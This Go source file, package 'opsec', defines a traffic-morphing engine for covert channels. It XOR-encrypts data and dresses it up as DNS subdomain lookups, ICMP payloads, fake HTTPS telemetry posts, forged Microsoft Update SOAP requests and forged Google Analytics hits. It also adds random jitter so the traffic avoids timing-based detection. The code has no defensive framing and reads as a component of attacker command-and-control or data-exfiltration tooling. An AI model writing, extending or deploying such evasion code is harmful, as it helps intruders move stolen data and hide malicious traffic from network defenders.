package opsec

import (
	"context"
	"encoding/base64"
	"fmt"
	"math/rand"
	"strings"
	"time"
)

type ChannelType string

const (
	ChannelDNS     ChannelType = "dns"
	ChannelICMP    ChannelType = "icmp"
	ChannelHTTPS   ChannelType = "https"
	ChannelMSUpdate ChannelType = "ms_update"
	ChannelGATraffic ChannelType = "ga_traffic"
	ChannelWebSocket ChannelType = "websocket"
)

type CovertChannelConfig struct {
	Type         ChannelType
	JitterMin    time.Duration
	JitterMax    time.Duration
	MorphEnabled bool
	PaddingSize  int
	Encrypt       bool
}

type TrafficMorphEngine struct {
	config CovertChannelConfig
	crypto CryptoProvider
}

type CryptoProvider interface {
	Encrypt(data []byte) ([]byte, error)
	Decrypt(data []byte) ([]byte, error)
}

func NewTrafficMorphEngine(config CovertChannelConfig, crypto CryptoProvider) *TrafficMorphEngine {
	return &TrafficMorphEngine{
		config: config,
		crypto: crypto,
	}
}

func (e *TrafficMorphEngine) MorphTraffic(ctx context.Context, data []byte, channel ChannelType) ([]byte, error) {
	if e.crypto != nil {
		encrypted, err := e.crypto.Encrypt(data)
		if err != nil {
			return nil, err
		}
		data = encrypted
	}

	switch channel {
	case ChannelDNS:
		return e.morphToDNS(data), nil
	case ChannelICMP:
		return e.morphToICMP(data), nil
	case ChannelHTTPS:
		return e.morphToHTTPS(data), nil
	case ChannelMSUpdate:
		return e.morphToMSUpdate(data), nil
	case ChannelGATraffic:
		return e.morphToGoogleAnalytics(data), nil
	default:
		return e.morphToHTTPS(data), nil
	}
}

func (e *TrafficMorphEngine) morphToDNS(data []byte) []byte {
	encoded := base64.RawURLEncoding.EncodeToString(data)
	chunks := chunkString(encoded, 32)
	var result []byte
	for _, chunk := range chunks {
		domain := fmt.Sprintf("%s.%s", chunk, "update.opsec.local")
		result = append(result, []byte(domain)...)
		result = append(result, '\n')
	}
	return result
}

func (e *TrafficMorphEngine) morphToICMP(data []byte) []byte {
	payload := make([]byte, len(data))
	copy(payload, data)
	for i := range payload {
		payload[i] ^= 0xAA
	}
	return payload
}

func (e *TrafficMorphEngine) morphToHTTPS(data []byte) []byte {
	template := `POST /api/v1/telemetry HTTP/1.1
Host: telemetry.opsec.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
Content-Length: %d

{"client_id":"%s","payload":"%s","timestamp":%d}`

	clientID := fmt.Sprintf("CLT-%d", rand.Intn(99999))
	encoded := base64.StdEncoding.EncodeToString(data)
	ts := time.Now().UnixMilli()
	result := fmt.Sprintf(template, len(encoded), clientID, encoded, ts)
	return []byte(result)
}

func (e *TrafficMorphEngine) morphToMSUpdate(data []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(data)
	template := `<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
<SOAP-ENV:Body>
<m:GetUpdateData xmlns:m="http://schemas.microsoft.com/msus/2004/04">
<updateId>%s</updateId>
<encryptedData>%s</encryptedData>
<signature>sig_%x</signature>
</m:GetUpdateData>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>`

	updateID := fmt.Sprintf("KB%d", 2000000+rand.Intn(999999))
	sig := rand.Int63()
	result := fmt.Sprintf(template, updateID, encoded, sig)
	return []byte(result)
}

func (e *TrafficMorphEngine) morphToGoogleAnalytics(data []byte) []byte {
	encoded := base64.StdEncoding.EncodeToString(data)
	template := `GET /collect?v=1&tid=UA-%d-%d&cid=%x&t=event&ec=app&ea=heartbeat&el=%s&ev=%d HTTP/1.1
Host: www.google-analytics.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*`

	accountID := 10000000 + rand.Intn(9999999)
	propertyID := 1 + rand.Intn(9)
	cid := rand.Int63()
	ev := rand.Intn(1000)
	result := fmt.Sprintf(template, accountID, propertyID, cid, encoded, ev)
	return []byte(result)
}

func (e *TrafficMorphEngine) AddJitter() time.Duration {
	if e.config.JitterMin == 0 {
		e.config.JitterMin = 100 * time.Millisecond
	}
	if e.config.JitterMax == 0 {
		e.config.JitterMax = 5 * time.Second
	}
	jitter := e.config.JitterMin + time.Duration(rand.Int63n(int64(e.config.JitterMax-e.config.JitterMin)))
	return jitter
}

func chunkString(s string, size int) []string {
	var chunks []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

type SimpleCrypto struct {
	key byte
}

func NewSimpleCrypto(key byte) *SimpleCrypto {
	return &SimpleCrypto{key: key}
}

func (c *SimpleCrypto) Encrypt(data []byte) ([]byte, error) {
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ c.key
	}
	return result, nil
}

func (c *SimpleCrypto) Decrypt(data []byte) ([]byte, error) {
	return c.Encrypt(data)
}
